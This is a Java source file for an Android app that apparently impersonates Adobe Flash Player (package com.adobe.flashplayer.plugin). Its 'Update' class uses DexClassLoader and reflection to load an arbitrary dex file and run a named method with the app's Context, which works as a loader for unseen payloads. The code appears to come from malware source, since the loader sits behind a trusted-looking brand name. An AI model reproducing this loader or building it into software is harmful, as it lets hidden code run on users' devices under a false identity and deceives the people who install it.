package com.adobe.flashplayer.plugin;

import java.lang.reflect.Method;
import android.content.Context;
import android.util.Log;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;

import dalvik.system.DexClassLoader;



public class Update implements Runnable {

    private String TAG = "[ljg]Update ";
    private String filename;
    private String classfuncname;
    private Context context;

    public Update(Context context, String filename, String clsfuncname){
        this.context = context;
        this.filename = filename;
        this.classfuncname = clsfuncname;
        return ;
    }

    public void run(){
        int pos = classfuncname.lastIndexOf(".");
        String classname = classfuncname.substring(0,pos);
        String funcname = classfuncname.substring(pos + 1);
        MyLog.writeLogFile("UpdateProc class:" + classname +" function:" + funcname +"\r\n");

        DexClassLoader loader = new DexClassLoader(filename, context.getCacheDir().getAbsolutePath(), null, context.getClass().getClassLoader());
        try {
            Class<?> cls = loader.loadClass(classname);
            MyLog.writeLogFile("class:" + cls +"\r\n");
            Class<?> [] params = new Class[1];

            params[0] = Context.class;
            Method method = cls.getDeclaredMethod(funcname, params);
            MyLog.writeLogFile("method:" + method +"\r\n");
            method.setAccessible(true);

            Object obj = cls.newInstance();
            MyLog.writeLogFile("object:" + obj +"\r\n");
            method.invoke(obj,context);
            MyLog.writeLogFile("UpdateProc class:" + classname +" function:" + funcname +"complete\r\n");
        } catch (Exception ex) {
            Log.e(TAG, "UpdateProc error");
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("UpdateProc exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }
    }
}
